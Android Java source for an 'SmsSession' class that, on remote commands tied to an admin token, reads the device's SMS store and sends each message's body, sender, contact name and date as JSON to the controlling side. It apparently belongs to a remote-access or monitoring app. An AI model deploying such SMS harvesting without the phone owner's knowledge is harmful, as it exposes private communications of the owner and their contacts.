package com.user.side.sessions;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import com.user.side.constants.Actions;
import com.user.side.constants.Constants;
import com.user.side.listeners.OnRequestSendMessageListener;
import com.user.side.model.SmsMessage;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.SortedMap;
import java.util.TreeMap;

public class SmsSession extends Session{
    public SmsSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
        super(context, adminToken, onRequestSendMessageListener, id);
    }

    @Override
    public void onMessageReceived(String message) {
        super.onMessageReceived(message);
        try {
            handleMessage(message);
        }
        catch (JSONException e){
            Log.e("SmsSession", "Error parsing message: " + message, e);
        }
    }

    private void handleMessage(String message) throws JSONException {
        JSONObject jsonObject = new JSONObject(message);

        String action = jsonObject.getString(Constants.ACTION_KEY);

        switch (action) {
            case Actions.ACTION_REQUEST_GET_CONVERSATIONS:
                sendConversations();
                break;
            case Actions.ACTION_REQUEST_GET_CONVERSATION:
                sendConversationMessages(jsonObject);

        }
    }

    private void sendConversationMessages(JSONObject jsonObject) throws JSONException {
        String number = jsonObject.getString(Constants.NUMBER_KEY);
        ArrayList<SmsMessage> smsMessages = getSmsMessages(number);

        for (SmsMessage smsMessage : smsMessages) {
            try {
                sendConversationMessage(smsMessage);
            } catch (JSONException e) {
                Log.e("SmsSession", "Error sending conversation: " + e.getMessage(), e);
            }
        }
    }

    private void sendConversationMessage(SmsMessage smsMessage) throws JSONException {
        JSONObject jsonObject = new JSONObject();

        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_CONVERSATION_MESSAGE);

        jsonObject.put("id", smsMessage.getId());
        jsonObject.put("body", smsMessage.getBody());
        jsonObject.put("date", smsMessage.getDate());
        jsonObject.put("address", smsMessage.getAddress());
        jsonObject.put("type", smsMessage.getType());
        jsonObject.put("person", smsMessage.getPerson());

        sendMessage(jsonObject.toString());
    }

    @SuppressLint("Range")
    private ArrayList<SmsMessage> getSmsMessages(String number) {
        ArrayList<SmsMessage> smsMessages = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, "address = ?", new String[]{number}, Telephony.Sms.DATE + " DESC");

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID));
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String person = cursor.getString(cursor.getColumnIndex(Telephony.Sms.PERSON));
                long dateMillis = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));

                SmsMessage smsMessage = new SmsMessage(id, address, person != null ? person : "Unknown", dateMillis, body, type);

                smsMessages.add(smsMessage);
            }

            cursor.close();
        }

        smsMessages.sort((o1, o2) -> {
            // Sort by date
            if (o1.getDate() > o2.getDate()) {
                return -1;
            } else if (o1.getDate() < o2.getDate()) {
                return 1;
            }
            return 0;
        });

        return smsMessages;
    }

    private void sendConversations() throws JSONException {
        ArrayList<SmsMessage> smsMessages = getLastSmsMessageFromEachAddress();
        for (SmsMessage smsMessage : smsMessages) {
            sendConversation(smsMessage);
        }
    }

    @SuppressLint("Range")
    private ArrayList<SmsMessage> getLastSmsMessageFromEachAddress() {
        ArrayList<SmsMessage> smsMessages = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, Telephony.Sms.DATE + " DESC");

        if (cursor != null) {
            SortedMap<String, SmsMessage> latestMessages = new TreeMap<>();

            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID));
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String person = cursor.getString(cursor.getColumnIndex(Telephony.Sms.PERSON));
                long dateMillis = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));

                SmsMessage smsMessage = new SmsMessage(id, address, person != null ? person : "Unknown", dateMillis, body, type);

                if (!latestMessages.containsKey(address)) {
                    latestMessages.put(address, smsMessage);
                }
            }

            cursor.close();
            smsMessages.addAll(latestMessages.values());
        }

        smsMessages.sort((o1, o2) -> {
            // Sort by date
            if (o1.getDate() > o2.getDate()) {
                return -1;
            } else if (o1.getDate() < o2.getDate()) {
                return 1;
            }
            return 0;
        });

        return smsMessages;
    }

    private void sendConversation(SmsMessage smsMessage) throws JSONException {
        JSONObject jsonObject = new JSONObject();

        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_CONVERSATION);

        jsonObject.put("id", smsMessage.getId());
        jsonObject.put("body", smsMessage.getBody());
        jsonObject.put("date", smsMessage.getDate());
        jsonObject.put("address", smsMessage.getAddress());
        jsonObject.put("type", smsMessage.getType());
        jsonObject.put("person", smsMessage.getPerson());

        sendMessage(jsonObject.toString());
    }
}
